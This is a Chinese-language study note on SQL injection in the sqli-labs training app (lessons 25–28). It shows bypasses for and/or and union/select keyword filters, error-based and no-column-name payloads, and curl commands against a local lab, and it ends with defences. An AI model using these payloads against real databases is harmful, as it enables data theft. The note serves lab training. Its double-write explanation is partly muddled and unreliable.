# 06-AND_OR 注入

> 前置：[[05-过滤空格|过滤空格]]（多重过滤常一起出现）
>
> sqli-labs 对照：less-25、less-25a（and/or 过滤）、less-27/28（union select 过滤，双写同理）

## 一、场景描述

服务端把 `and`、`or` 加入黑名单：

```php
// less-25 原型
$id = preg_replace('/or/i', '', $id);      // 不区分大小写替换
$id = preg_replace('/and/i', '', $id);
```

影响面很大：`and 1=1`、`or 1=1` 失效之外，**information_schema 里含 "or" 的表名、password 字段里的 "or" 都会被误伤**——这也是本章要一并解决的信息收集替代方案。

### 被连带误伤的常见词

| 词 | 含 or/and 的部分 | 绕过写法 |
|----|-----------------|---------|
| information_schema | inf**or**mation | `infoorrmation_schema` |
| password | passw**or**d | `passwoorr d` 去空格即 `passwoorrd` |
| order by | **or**der | `oorrder by` |
| double | dou**b**le 无关 | 不受影响 |
| rand() | 无关 | 不受影响 |

记住这条规则后，less-25 系列的 payload 才能一次打对。

## 二、绕过手法总表

| 手法 | 写法 | 适用场景 |
|------|------|---------|
| 符号替代 | `&&` 替代 and、`\|\|` 替代 or | 最常用；URL 中需编码 `%26%26`、`%7c%7c` |
| 双写绕过 | `anandd`、`oorr`、`uniunionon`、`selselectect` | 针对"替换一次"型过滤（preg_replace 无递归） |
| 大小写混合 | `Or`、`AND`、`oR` | 针对区分大小写过滤（less-25 是 `/i` 所以无效） |
| 运算符变形 | 见下节运算符表 | 布尔判断类 payload |
| 注释拆词 | `un/**/ion`、`sel/**/ect` | 同时有空格过滤时复用 |

### URL 编码要点

```text
&& → %26%26        || → %7c%7c
```

直接在 URL 里写 `&` 会被当成参数分隔符截断，必须编码；Burp Repeater 的 raw 模式或 curl 里写 `%26%26`。

## 三、运算符变形表

布尔逻辑不一定非要 and/or，比较与位运算都能构造条件：

| 目标 | 替代写法 |
|------|---------|
| `and` 连接条件 | `&&`、`%26%26` |
| `or` 连接条件 | `\|\|`、`%7c%7c` |
| 等值判断 `=` | `like`、`regexp`、`between a and b`（注意 between 内部有 and，配合双写） |
| 非 `!=` | `<>' 、`not like` |
| 数值比较 | `>` `<` `>=` `<=` 本身不被过滤时直接用 |
| 异或分支 | `xor`（MySQL 支持，两侧一真一假返回真）、`^` 位异或 |
| 取反 | `!`、`not` |

示例：

```sql
-- 原版: ' and extractvalue(1,concat(0x7e,database()))#
-- && 版
' && extractvalue(1,concat(0x7e,database())) && '1
-- xor 版（数字型）
1 xor updatexml(1,concat(0x7e,database()),1)
-- ^ 版
1 ^ (extractvalue(1,concat(0x7e,database())))
```

## 四、双写绕过详解

`preg_replace('/and/i','',$id)` 只做一次扫描替换，输入 `aanandd` 时：

```text
aanandd  →  删除中间的 and  →  aand? 不对，逐字符看:
a-a-n-a-n-d-d → 匹配到位置3-5的 "and" 删除 → 剩 "aa" + "nd" = "aand"? 
实际: aanandd 删除 an-d 组合 → 剩余 "and"
```

正确理解：`anandd` 中间含 `and`（位置2-4），删除后剩下首尾拼接正好是 `and`。同理 `oorr`、`uni unionon` 写作 `uniunionon`、`selselectect`。

```sql
-- less-27: 过滤 union/select
-1' uniunionon selselectect 1,2,3#
-- less-25: 过滤 and/or + information_schema 被伤
-1' union select 1,group_concat(table_name),3 from infoorrmation_schema.tables where table_schema=database()#
```

注意最后一例：**`information_schema` 含 or，必须写成 `infoorrmation_schema`**——这是新手最容易漏的点。

## 五、information_schema 被彻底过滤时的替代方案

MySQL 5.5.10+ 可用这些视图绕过（部分无需 information_schema 权限）：

| 替代品 | 用途 | 示例 |
|--------|------|------|
| `sys.schema_table_statistics` / `sys.x$schema_table_statistics` | 枚举表名 | `select table_name from sys.schema_table_statistics where table_schema=database()` |
| `mysql.innodb_table_stats` | 枚举库下所有表 | `select table_name from mysql.innodb_table_stats where database_name=database()` |
| `mysql.innodb_index_stats` | 同上备用 | 同上结构 |
| `sys.schema_table_statistics_with_buffer` | 表名枚举备用 | 同 schema_table_statistics |

### 无列名注入（拿列名也被拦时的终极方案）

不知道列名也能取数据，原理是 **join using 报错带出列名** 或 **别名占位直接查**：

```sql
-- 方法一: join ... using(已知列) 制造重复列报错，错误信息里暴露另一表的列名
select * from (select * from users a join users b using(username,0)) c;
-- 报错: Duplicate column name 'password' ← 得到下一个列名

-- 方法二: 完全无列名查询 —— 用序号别名代替列名
select `2` from (select 1,2,3,4,5,6,7,8,9,10,11,12,13 union select * from users) a limit 1,1;
-- 第 2 个字段的内容直接被取出

-- 配合报错注入压缩成一条 payload
' and extractvalue(1,concat(0x7e,(select `2` from (select 1,2,3,4,5,6,7,8,9,10,11,12,13 union select * from users)a limit 1,1)))#
```

方法二的原理：`select 1,2,...,13` 构造一行数字占位行与真实表 union，外层用反引号序号引用第 N 列——全程不需要知道任何列名。逐个换 `` `2` `` 为 `` `3` ``、`` `4` `` 即可遍历所有字段。

### sys 库视图的前提条件

| 条件 | 说明 |
|------|------|
| MySQL 版本 | sys schema 需 MySQL 5.7+ 默认内置 |
| 权限 | 普通应用账号通常有 sys 库只读权限（默认授权给所有人） |
| innodb_table_stats | 需要 information_schema 也被拦时从 mysql 库直接读 |

版本过老（< 5.7）没有 sys 库时，退路是暴力猜测表名：`and (select count(*) from admin)>0` 之类字典碰撞。

## 六、payload 示例集

```bash
# less-25: 单引号闭合，|| 与 %26%26
curl -s "http://127.0.0.1/sqli-labs/Less-25/?id=-1'%7c%7cextractvalue(1,concat(0x7e,database()))"

# 双写版爆数据
curl -s "http://127.0.0.1/sqli-labs/Less-25/?id=-1'%20uniunionon%20seleselectct%201,group_concat(username,0x3a,passwoorrd),3%20from%20users#"
# 注意 password 也含 or → passwoorrd

# less-25a: 数字型无引号闭合
curl -s "http://127.0.0.1/sqli-labs/Less-25a/?id=-1%20union%20select%201,database(),3"

# less-27: union/select 被过滤（大小写+双写都要防）
curl -s "http://127.0.0.1/sqli-labs/Less-27/?id=-1'%20UNIunionON%20SEleselectCT%201,2,3%23"

# less-28: union+select 整体被过滤
curl -s "http://127.0.0.1/sqli-labs/Less-28/?id=0')%0aunion%0aunion%0aselect%0aselect%0a1,database(),3%23"
```

易错点汇总：

| 易错点 | 说明 |
|-------|------|
| 忘记编码 `&` | URL 参数里裸 `&` 截断参数，payload 半截失效 |
| 只双写关键字不修表名 | `information_schema`、`password`、`order by`（含 or）都要处理 |
| `between ... and` 被 and 过滤波及 | 改用双写 `betweeandnd` 不存在，应改用 `like`/`regexp` |
| 双写对递归替换无效 | 若服务端循环替换直到无匹配，双写失效，换符号方案 |

## 七、防御

| 措施 | 说明 |
|------|------|
| 参数化查询 | 黑名单过滤（删 and/or/空格）全部可以省掉，且更安全 |
| 黑名单不可靠 | 双写、编码、符号替代层出不穷，黑名单只增加攻击成本不封死路径 |
| 输入白名单校验 | id 整数化等结构性校验优于关键字删除 |
| 收敛数据库权限 | 禁止应用账号读 mysql/sys 库，降低信息收集替代方案的可用性 |

### 关联阅读

- 空格同时被过滤时的组合打法见 [[05-过滤空格|过滤空格]]
- order by 位置的 and/or 变形见 [[07-ORDER_BY注入|ORDER BY 注入]]
- 双写与编码的 sqlmap 自动化对照见 [[09-综合训练|综合训练]] 的 tamper 表

---
**返回** [[mysql结构总目录|mysql结构 总目录]]
